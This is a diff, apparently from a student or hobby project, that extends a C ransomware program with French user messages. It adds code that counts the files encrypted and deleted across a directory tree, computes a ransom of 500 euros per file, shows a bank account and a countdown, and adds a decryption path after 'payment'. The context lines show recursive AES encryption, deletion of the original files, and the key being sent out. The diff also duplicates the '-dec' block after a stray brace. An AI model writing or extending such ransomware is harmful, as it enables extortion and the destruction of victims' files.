@@ -90,8 +90,28 @@ int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryp
 		return 1;
 	}
 }
+void timer (int mount)
+{
+    for( int i = 10; i > 0; i--)
+ 	{
+    printf("Il vous reste %d secondes.\n", i);
+	printf("Compte bancaire : BE56751251151 \n");
+    sleep(1);
+ 	}
+	printf("Merci d'avoir payé : %d Euros \n",mount);
 
-void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
+}
+
+int amount_to_pay(int nb)
+{
+	printf("Nombre de fichier crypté : %d	\n",nb);
+	printf("Tarif par fichier crypté : 500 euros \n");
+	int mount = nb*500;
+	printf("Votre raçons à payer s'élève à : %d \n",mount );
+	timer(mount);
+}
+
+void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag,int *nb)
 {
 	DIR* dir = opendir(name);
 	
@@ -115,12 +135,14 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
 			if(entity->d_type == DT_DIR && strcmp(entity->d_name, ".")!=0 && strcmp(entity->d_name, "..")!=0)
 			{
-				listdir(path, iv, key, de_flag);
+				listdir(path, iv, key, de_flag,nb);
 			}
 			
 			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0 && !is_a_video(entity->d_name) ==0)
 			{				
 				encrypt(key, iv, path);
+				//change_nb(nb);
+				*nb = *nb+1;
 				remove(path);				
 			}
 			
@@ -235,6 +257,7 @@ int main (int argc, char * argv[])
 
 	int sizeKey = AES_256_KEY_SIZE; 
 	int sizeIv = AES_BLOCK_SIZE;
+	int nb_encrpt_file = 0;
 	
 	if(strcmp(argv[2], "-enc")==0 && argc==3) 
 	{
@@ -244,14 +267,33 @@ int main (int argc, char * argv[])
 		printf("The directory is %s\n", argv[1]);
 		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 		send_key(pKey, pIv);
-		listdir(argv[1], iv, key, 'e');
+		listdir(argv[1], iv, key, 'e',&nb_encrpt_file);
 		// vlc();
 		
 		// free((char *)pKey);
 		// free((char *)pIv);
 		memset(pKey, '\0', sizeKey);
 		memset(pIv, '\0', sizeIv);
+		printf("--------------------------------------\n");
+		amount_to_pay(nb_encrpt_file);
 	}
+	
+	if (strcmp(argv[2], "-dec")==0 && argc==5)
+	{
+		hexa_to_bytes(argv[3] , key, sizeKey);	
+		hexa_to_bytes(argv[4] , iv, sizeIv);
+		listdir(argv[1], iv, key, 'd',&nb_encrpt_file);
+		printf("Merci d'avoir payer la rançon !");
+		
+		memset(key, '\0', sizeKey); //A vérifier si c'est bon
+		memset(iv, '\0', sizeIv); //A vérifier si c'est bon
+	}
+	
+	if(strcmp(argv[1], "--help")==0 & argc==2)
+	{
+		usage();
+	}
+}
 	
 	if (strcmp(argv[2], "-dec")==0 && argc==5)
 	{
